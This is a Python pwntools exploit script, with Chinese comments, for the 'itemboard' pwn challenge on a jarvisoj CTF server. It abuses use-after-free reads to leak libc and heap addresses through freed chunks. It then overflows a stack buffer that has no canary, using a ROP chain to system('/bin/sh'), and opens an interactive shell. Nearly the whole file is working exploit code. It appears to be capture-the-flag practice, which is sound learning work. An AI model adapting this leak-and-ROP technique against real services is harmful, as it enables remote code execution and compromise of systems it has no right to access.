#!/usr/bin/env python
# -*- coding: utf-8 -*-
# 
from pwn import *
context.log_level = 'debug'
context.terminal = ['deepin-terminal', '-x', 'sh', '-c']
# 这题目有一点是new item的时候，先将description存储在栈变量buf上，之后再copy到堆
# 并且没有canary，没有canary，没有canary！
# 很容易想到利用new的的时候直接进行overflow，并且free之后能够直接leak出libc基址，直接rop到system('/bin/sh')

# io = process('./itemboard', env = {"LD_PRELOAD": "./libc-2.19.so"})
# gdb.attach(io,'b * new_item+319')
raw_input('debug>')
io = remote('pwn2.jarvisoj.com', 9887)
elf = ELF('./itemboard')

libc = ELF('./libc-2.19.so')
main_arena_offset = 0x3be760
sys_libc = libc.sym['system']
rdi = 0x22b9a
# add an item
io.sendlineafter('choose:\n', "1")
io.sendlineafter('name?\n', 'aaaa')
io.sendlineafter('len?\n', '144')
io.sendlineafter('tion?\n', "AAAA")

# add another
io.sendlineafter('choose:\n', '1')
io.sendlineafter('name?\n', 'bbbb')
io.sendlineafter('len?\n', '144')
io.sendlineafter('tion?\n', 'BBBB')

# add third one
io.sendlineafter('choose:\n', '1')
io.sendlineafter('name?\n', 'cccc')
io.sendlineafter('len?\n', '144')
io.sendlineafter('tion?\n', 'CCCC')

# add fourth one
io.sendlineafter('choose:\n', '1')
io.sendlineafter('name?\n', 'dddd')
io.sendlineafter('len?\n', '144')
io.sendlineafter('tion?\n', 'DDDD')


# delete 0, leak libc base here
io.sendlineafter('choose:\n', '4')
io.sendlineafter('item?\n', '0')

# delete 1,leak elf base here
io.sendlineafter('choose:\n', '4')
io.sendlineafter('item?\n', '1')


# show 0
io.sendlineafter('choose:\n', '3')
io.sendlineafter('item?\n', '0')

# leak libc base
io.recvuntil('tion:')
libc_base = u64(io.recvuntil('\x7f').ljust(8, '\x00'))
# print 'len of output ->' + str(len(libc_base))
libc_base = libc_base - 88 - main_arena_offset
success('libc_base: {:#x}'.format(libc_base))
sys_addr = libc_base + sys_libc
binsh = libc_base + libc.search('/bin/sh').next()
success('system: {:#x}'.format(sys_addr))
success('binsh: {:#x}'.format(binsh))

#show 1 leak elf base
io.sendlineafter('choose:\n', '3')
io.sendlineafter('item?\n','1')
io.recvuntil('tion:')
heapad = u64(io.recv(6).ljust(8, '\x00'))
success('heap addr {:#x}'.format(heapad))
# raw_input('ok?')

# delete 2 and show 1&2 to find the heap
io.sendlineafter('choose:\n', '4')
io.sendlineafter('item?\n', '2')
io.sendlineafter('choose:\n', '3')
io.sendlineafter('item?\n', '1')
io.recvuntil('tion:')
heapad = u64(io.recv(6).ljust(8, '\x00'))
success('heap addr -> {:#x}'.format(heapad))
# raw_input('next to see 2')
io.sendlineafter('choose:\n', '3')
io.sendlineafter('item?\n', '2')
io.recvuntil('tion:')
heapad = u64(io.recv(6).ljust(8, '\x00'))
success('head addr -> {:#x}'.format(heapad))
raw_input('ok?')
heapad = heapad & 0xfffffffff000
fakeitem = heapad+0x390
success('fakeitem -> {:#x}'.format(fakeitem))

# stack overflow
rdi += libc_base
padding = 'this is wait to be copyed\x00'+'a' * (0x400-26) + '\x00' * 4

payload = padding +p32(1024) + p64(fakeitem) +'11112222'+ p64(rdi) + p64(binsh) + p64(sys_addr)
io.sendlineafter('choose:\n', '1')
# gdb.attach(io, 'bpie 0xcba')
io.sendlineafter('name?\n', 'bingo')
io.sendlineafter('len?\n', str(len(payload)))
io.sendlineafter('tion?\n', payload)

io.interactive()
io.close()



